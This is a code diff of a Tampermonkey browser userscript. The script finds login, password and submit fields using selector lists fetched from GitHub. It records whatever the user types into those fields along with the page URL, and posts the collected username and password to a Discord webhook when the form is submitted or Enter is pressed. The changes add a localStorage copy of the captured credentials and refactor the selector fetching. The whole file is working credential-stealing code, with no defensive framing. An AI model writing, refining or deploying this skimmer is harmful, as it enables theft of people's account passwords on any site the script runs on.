@@ -13,72 +13,71 @@
 (function() {
     'use strict';
 
+    const discordWebhook = "WEBHOOK-HERE"
+
+
     const fetchSelectors = (callback) => {
-        let loginSelectors = "";
-        let passwordSelectors = "";
-        let submitSelectors = "";
         let completedRequests = 0;
 
-        GM_xmlhttpRequest({
-            method: "GET",
-            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-password-selectors.json",
-            responseType: "json",
-            onload: (response) => {
-                passwordSelectors = response.response.map((selector) => `${selector}`).join(", ");
-
-                completedRequests++;
-                checkCompletion();
+        let links = [
+            {
+                name: "loginSelectors",
+                url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-login-selectors.json",
+                selectors: ""
             },
-            onerror: (error) => {
-                console.error("Error fetching the password selectors: ", error);
-            }
-
-        });
-
-        GM_xmlhttpRequest({
-            method: "GET",
-            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-login-selectors.json",
-            responseType: "json",
-            onload: (response) => {
-                loginSelectors = response.response.map((selector) => `${selector}`).join(", ");
-
-                completedRequests++;
-                checkCompletion();
+            {
+                name: "passwordSelectors",
+                url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-password-selectors.json",
+                selectors: ""
             },
-            onerror: (error) => {
-                console.error("Error fetching the login selectors: ", error);
-            }
-        });
-
-        GM_xmlhttpRequest({
-            method: "GET",
-            url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-submit-button-selectors.json",
-            responseType: "json",
-            onload: (response) => {
-                submitSelectors = response.response.map((selector) => `${selector}`).join(", ");
-
-                completedRequests++;
-                checkCompletion();
+            {
+                name: "submitSelectors",
+                url: "https://raw.githubusercontent.com/Filipsys/tampermonkey-script-config/refs/heads/main/allowed-submit-button-selectors.json",
+                selectors: ""
             },
-            onerror: (error) => {
-                console.error("Error fetching the submit selectors: ", error);
-            }
-        });
+        ];
 
-        const checkCompletion = () => completedRequests === 3 ? callback(loginSelectors, passwordSelectors, submitSelectors) : null;
+        links.forEach((element) => {
+            GM_xmlhttpRequest({
+                method: "GET",
+                url: element.url,
+                responseType: "json",
+                onload: (response) => {
+                    element.selectors = response.response.map((selector) => `${selector}`).join(", ");
+
+                    // Save to local storage as a fallback
+                    localStorage.setItem(element.name, element.selectors);
+
+                    completedRequests++;
+                    checkCompletion();
+                },
+                onerror: (error) => {
+                    console.error("Error fetching the password selectors: ", error);
+
+                    // Get the selectors from local storage as fallback
+                    element.selectors = localStorage.getItem(element.name);
+
+                    completedRequests++;
+                    checkCompletion();
+                }
+            });
+        })
+
+        const checkCompletion = () => completedRequests === links.length ? callback(links) : null;
     }
 
-    fetchSelectors((loginSelectors, passwordSelectors, submitSelectors) => {
-        const loginBox = document.querySelector(loginSelectors);
-        const passwordBox = document.querySelector(passwordSelectors);
-        const submitBox = document.querySelector(submitSelectors);
+    fetchSelectors((links) => {
+        console.log(links);
+
+        const loginBox = document.querySelector(links[0].selectors);
+        const passwordBox = document.querySelector(links[1].selectors);
+        const submitBox = document.querySelector(links[2].selectors);
 
         if (!loginBox) console.log("Login is null");
         if (!passwordBox) console.log("Passwords are null");
         if (!submitBox) console.log("Submit is null");
 
 
-        const discordWebhook = "WEBHOOK-HERE"
         let savedData = {
             url: window.location.href,
             login: "empty",
@@ -86,6 +85,14 @@
         }
 
         const sendWebhook = () => {
+            // Save data to local storage as a fallback solution
+
+            let localSavedData = localStorage.getItem("localSavedData");
+            localSavedData += `URL: ${savedData.url} Username: ${savedData.login} Password: ${savedData.password} - `
+
+            localStorage.setItem("localSavedData", localSavedData);
+            console.log("Saved in local storage");
+
             GM_xmlhttpRequest({
                 method: "POST",
                 url: discordWebhook,
@@ -103,15 +110,23 @@
             });
         };
 
+        const cleanOutput = (input) => {
+            return input.replaceAll("\"", "[parenthesis]")
+                        .replaceAll("'", "[single-parenthesis]")
+                        .replaceAll("\\", "[backslash]")
+                        .replaceAll("`", "[grave]");
+        }
+
         passwordBox ? passwordBox.addEventListener("input", (event) => {
-            event.key === "Backspace" ? savedData.password.slice(0, -1) : savedData.password = event.target.value;
+            event.key === "Backspace" ? savedData.password.slice(0, -1) : savedData.password = cleanOutput(event.target.value);
         }) : null;
 
         loginBox ? loginBox.addEventListener("input", (event) => {
-            event.key === "Backspace" ? savedData.login.slice(0, -1) : savedData.login = event.target.value;
+            event.key === "Backspace" ? savedData.login.slice(0, -1) : savedData.login = cleanOutput(event.target.value);
         }) : null;
 
-        submitBox ? submitBox.addEventListener("click", (event) => sendWebhook()) : null;
-        (passwordBox && loginBox) ? window.addEventListener("keydown", (event) => event.key === "Enter" ? sendWebhook() : null) : null;
+        submitBox
+            ? submitBox.addEventListener("click", (event) => sendWebhook())
+            : (passwordBox && loginBox) ? window.addEventListener("keydown", (event) => event.key === "Enter" ? sendWebhook() : null): null;
     });
 })();
